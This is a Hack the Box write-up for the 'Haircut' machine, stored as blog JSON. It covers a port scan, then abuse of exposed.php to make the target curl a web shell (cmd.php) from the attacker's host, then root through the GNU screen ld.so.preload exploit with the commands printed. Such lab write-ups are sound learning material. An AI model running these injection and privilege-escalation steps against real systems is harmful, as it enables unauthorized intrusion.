{"title":"HTB Haircut","uid":"19ae3ca2912f232f5cd7c20cd328b074","slug":"Virtual Attack[18]","date":"2022-12-16T14:18:00.000Z","updated":"2024-03-13T00:55:14.868Z","comments":true,"path":"api/articles/Virtual Attack[18].json","keywords":null,"cover":[],"content":"<h2 id=\"PORT-SCAN\"><a href=\"#PORT-SCAN\" class=\"headerlink\" title=\"PORT SCAN\"></a>PORT SCAN</h2><pre class=\"line-numbers language-latex\" data-language=\"latex\"><code class=\"language-latex\"># Nmap 7.93 scan initiated Thu Dec 15 01:16:36 2022 as: nmap -p- --min-rate 1000 -oN portscan.txt 10.10.10.24\nWarning: 10.10.10.24 giving up on port because retransmission cap hit (10).\nNmap scan report for 10.10.10.24\nHost is up (0.29s latency).\nNot shown: 65130 closed tcp ports (reset), 403 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\n# Nmap done at Thu Dec 15 01:19:02 2022 -- 1 IP address (1 host up) scanned in 146.69 seconds\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<span id=\"more\"></span>\n\n<h2 id=\"Web-content-discovery\"><a href=\"#Web-content-discovery\" class=\"headerlink\" title=\"Web content discovery\"></a>Web content discovery</h2><ol>\n<li><code>uploads/</code></li>\n<li><code>exposed.php</code></li>\n</ol>\n<p><code>exposed.php</code> it might run as <code>curl</code> command<br><img src=\"https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FrRk40Ag3kQ5lokAyYh5EZQd0Rj8.png\"><br>I found we can write some files in the machine.<br><img src=\"https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FnKpucycThcDtBXl2aVjIs_D4g_P.png\"></p>\n<pre class=\"line-numbers language-latex\" data-language=\"latex\"><code class=\"language-latex\">http://<span class=\"token punctuation\">[</span>ip<span class=\"token punctuation\">]</span>/cmd.php -o cmd.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fuh4eQ3XbCRlGmZ_zufRNk4SuoYh.png\"></p>\n<p><img src=\"https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fk3vm7tjT6A-0yCeRBRAVf40ts-B.png\"></p>\n<h2 id=\"www-data-shell\"><a href=\"#www-data-shell\" class=\"headerlink\" title=\"www-data shell\"></a>www-data shell</h2><p><img src=\"https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqkgxfCOj3uU1khdEJOXnWGx5_FA.png\"></p>\n<p>We find the 2 flags in this machine :-)<br><img src=\"https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fms1tZs6gJsnTIuZ-MsjXcTo8smz.png\"></p>\n<h2 id=\"Privilege-escalation\"><a href=\"#Privilege-escalation\" class=\"headerlink\" title=\"Privilege escalation\"></a>Privilege escalation</h2><p><img src=\"https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fo3K33ABrOPupg4OyotlyzP8gD9C.png\"><br><a href=\"https://www.exploit-db.com/exploits/41154\">https://www.exploit-db.com/exploits/41154</a></p>\n<p>But I can’t run the binary with the high GLIBC version<code>GLIBC_2.34</code>.<br>So I complie the files in <code>Centos</code>, and upload the <code>libhax.so</code>, and <code>rootshell</code>.</p>\n<p><img src=\"https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhNyyoKJZxIMDeFOHGf5iDx2_5Gp.png\"></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">cd</span> /etc\n<span class=\"token builtin class-name\">umask</span> 000 <span class=\"token comment\"># because</span>\n<span class=\"token function\">screen</span> <span class=\"token parameter variable\">-D</span> <span class=\"token parameter variable\">-m</span> <span class=\"token parameter variable\">-L</span> ld.so.preload <span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-ne</span>  <span class=\"token string\">\"<span class=\"token entity\" title=\"\\x0a\">\\x0a</span>/tmp/libhax.so\"</span> <span class=\"token comment\"># newline needed</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fm3_mSHcuydnIeNKGEF7wbV2Frxk.png\"></p>\n","text":"PORT SCAN# Nmap 7.93 scan initiated Thu Dec 15 01:16:36 2022 as: nmap -p- --min-rate 1000 -oN portscan.txt 10.10.10.24 Warning: 10.10.10.24 ...","link":"","photos":[],"count_time":{"symbolsCount":"1k","symbolsTime":"1 mins."},"categories":[{"name":"Penetration Test","slug":"Penetration-Test","count":20,"path":"api/categories/Penetration-Test.json"}],"tags":[{"name":"Hack the Box","slug":"Hack-the-Box","count":10,"path":"api/tags/Hack-the-Box.json"},{"name":"Penestration Test","slug":"Penestration-Test","count":6,"path":"api/tags/Penestration-Test.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#PORT-SCAN\"><span class=\"toc-text\">PORT SCAN</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Web-content-discovery\"><span class=\"toc-text\">Web content discovery</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#www-data-shell\"><span class=\"toc-text\">www-data shell</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Privilege-escalation\"><span class=\"toc-text\">Privilege escalation</span></a></li></ol>","author":{"name":"Leviathan","slug":"blog-author","avatar":"https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/avatar.jpg","link":"/","description":"Cybersec student","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"HTB Popcorn","uid":"11c79fec8a41036689b6be063d1dcd0c","slug":"Virtual Attack[17]","date":"2022-12-16T14:18:00.000Z","updated":"2024-03-13T00:55: